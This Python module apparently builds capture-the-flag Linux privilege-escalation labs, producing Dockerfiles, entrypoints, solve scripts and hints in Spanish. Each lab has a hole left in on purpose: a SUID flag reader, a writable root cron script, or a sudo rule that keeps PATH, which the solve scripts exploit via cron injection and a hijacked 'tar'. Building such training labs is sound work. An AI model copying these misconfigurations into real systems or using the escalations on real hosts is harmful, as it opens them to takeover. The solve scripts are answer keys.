# -*- coding: utf-8 -*-
"""Builders Linux (contenedores SSH)."""


def _base(user, pw):
    return (
        "FROM debian:12-slim\n"
        "RUN apt-get update && apt-get install -y --no-install-recommends "
        "openssh-server gcc libc6-dev procps sudo cron && rm -rf /var/lib/apt/lists/*\n"
        "RUN mkdir -p /run/sshd\n"
        "RUN useradd -m -s /bin/bash %s && echo '%s:%s' | chpasswd\n"
        "RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config\n"
        "EXPOSE 2222\n"
    ) % (user, user, pw)


def _flagwrite():
    # Escribe la flag de runtime (RP_FLAG) en /root/flag.txt, solo root.
    return ("echo \"${RP_FLAG:-RP{flag_no_asignada}}\" > /root/flag.txt\n"
            "chmod 600 /root/flag.txt\n"
            "chown root:root /root/flag.txt\n")


def _entry():
    return "#!/bin/bash\nssh-keygen -A\n" + _flagwrite() + "exec /usr/sbin/sshd -D -e -p 2222\n"


def _solve(cmd):
    return ("#!/usr/bin/env bash\n"
            "sshpass -p \"${PASSWORD}\" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
            "-p \"${PORT}\" \"${USER}\"@127.0.0.1 \"%s\" | grep -o 'RP{[^}]*}'\n" % cmd)


def _t_linux_suid(spec, flag):
    u = spec["spec"].get("user", "player"); pw = spec["spec"].get("password", "player")
    b = spec["spec"].get("bin", "readflag")
    dockerfile = _base(u, pw)
    dockerfile += (
        "COPY suid.c /suid.c\n"
        "RUN gcc -o /usr/local/bin/%s /suid.c && chown root:root /usr/local/bin/%s && chmod 4755 /usr/local/bin/%s\n"
        "COPY entrypoint.sh /entrypoint.sh\n"
        "RUN chmod +x /entrypoint.sh\n"
        "ENTRYPOINT [\"/entrypoint.sh\"]\n"
    ) % (b, b, b)
    suid_c = ('#include <fcntl.h>\n#include <unistd.h>\n'
              'int main(void){int fd=open("/root/flag.txt",O_RDONLY);'
              'if(fd<0)return 1;char b[512];ssize_t n;'
              'while((n=read(fd,b,sizeof b))>0)write(1,b,n);return 0;}\n')
    files = {"Dockerfile": dockerfile, "suid.c": suid_c, "entrypoint.sh": _entry()}
    solve = _solve("/usr/local/bin/%s" % b)
    note = "Busca binarios SUID (find / -perm -4000 -type f 2>/dev/null) y ejecuta /usr/local/bin/%s." % b
    return files, solve, {"kind": "service", "internal_port": 2222, "user": u, "password": pw,
                          "connection": "ssh %s@HOST -p PORT (password: %s)" % (u, pw)}, note


def _t_linux_cron(spec, flag):
    u = spec["spec"].get("user", "player"); pw = spec["spec"].get("password", "player")
    dockerfile = _base(u, pw)
    dockerfile += (
        "COPY backup.sh /usr/local/bin/backup.sh\n"
        "RUN mkdir -p /var/backups && echo '*/1 * * * * root /usr/local/bin/backup.sh' > /etc/cron.d/rootpath "
        "&& chmod 777 /usr/local/bin/backup.sh\n"
        "COPY entrypoint.sh /entrypoint.sh\n"
        "RUN chmod +x /entrypoint.sh\n"
        "ENTRYPOINT [\"/entrypoint.sh\"]\n"
    )
    backup = "#!/bin/bash\n# respaldo nocturno de la imprenta\ndate >> /var/backups/run.log\n"
    entry = "#!/bin/bash\nssh-keygen -A\n" + _flagwrite() + "cron\nexec /usr/sbin/sshd -D -e -p 2222\n"
    files = {"Dockerfile": dockerfile, "backup.sh": backup, "entrypoint.sh": entry}
    solve = _solve(
        "echo 'cp /root/flag.txt /tmp/flag.txt; chmod 644 /tmp/flag.txt' >> /usr/local/bin/backup.sh; "
        "sleep 70; cat /tmp/flag.txt")
    note = "El cron de root ejecuta /usr/local/bin/backup.sh, que es modificable. "
    note += "Anade una linea que copie /root/flag.txt y espera a que corra el cron."
    return files, solve, {"kind": "service", "internal_port": 2222, "user": u, "password": pw,
                          "connection": "ssh %s@HOST -p PORT (password: %s)" % (u, pw)}, note


def _t_linux_sudo(spec, flag):
    u = spec["spec"].get("user", "player"); pw = spec["spec"].get("password", "player")
    dockerfile = _base(u, pw)
    dockerfile += (
        "COPY backup.sh /usr/local/bin/backup.sh\n"
        "COPY sudoers /etc/sudoers.d/rootpath\n"
        "RUN mkdir -p /srv/www && chmod 755 /usr/local/bin/backup.sh && chmod 440 /etc/sudoers.d/rootpath\n"
        "COPY entrypoint.sh /entrypoint.sh\n"
        "RUN chmod +x /entrypoint.sh\n"
        "ENTRYPOINT [\"/entrypoint.sh\"]\n"
    )
    backup = "#!/bin/bash\n# tarea administrativa: empaquetar el sitio\ntar -czf /var/backups/www.tar.gz /srv/www 2>/dev/null\n"
    sudoers = (
        "Defaults !secure_path\n"
        "Defaults env_keep += \"PATH\"\n"
        "%s ALL=(ALL) NOPASSWD: /usr/local/bin/backup.sh\n" % u
    )
    files = {"Dockerfile": dockerfile, "backup.sh": backup, "sudoers": sudoers, "entrypoint.sh": _entry()}
    solve = _solve(
        "mkdir -p /tmp/bin; printf '#!/bin/bash\\n/bin/cat /root/flag.txt\\n' > /tmp/bin/tar; "
        "chmod +x /tmp/bin/tar; PATH=/tmp/bin:$PATH sudo /usr/local/bin/backup.sh")
    note = "sudo -l revela que puedes ejecutar /usr/local/bin/backup.sh sin clave y que PATH se conserva "
    note += "(env_keep). Secuestra 'tar' creando un binario malicioso en un PATH que controles."
    return files, solve, {"kind": "service", "internal_port": 2222, "user": u, "password": pw,
                          "connection": "ssh %s@HOST -p PORT (password: %s)" % (u, pw)}, note


BUILDERS = {
    "linux_suid": _t_linux_suid,
    "linux_cron": _t_linux_cron,
    "linux_sudo": _t_linux_sudo,
}
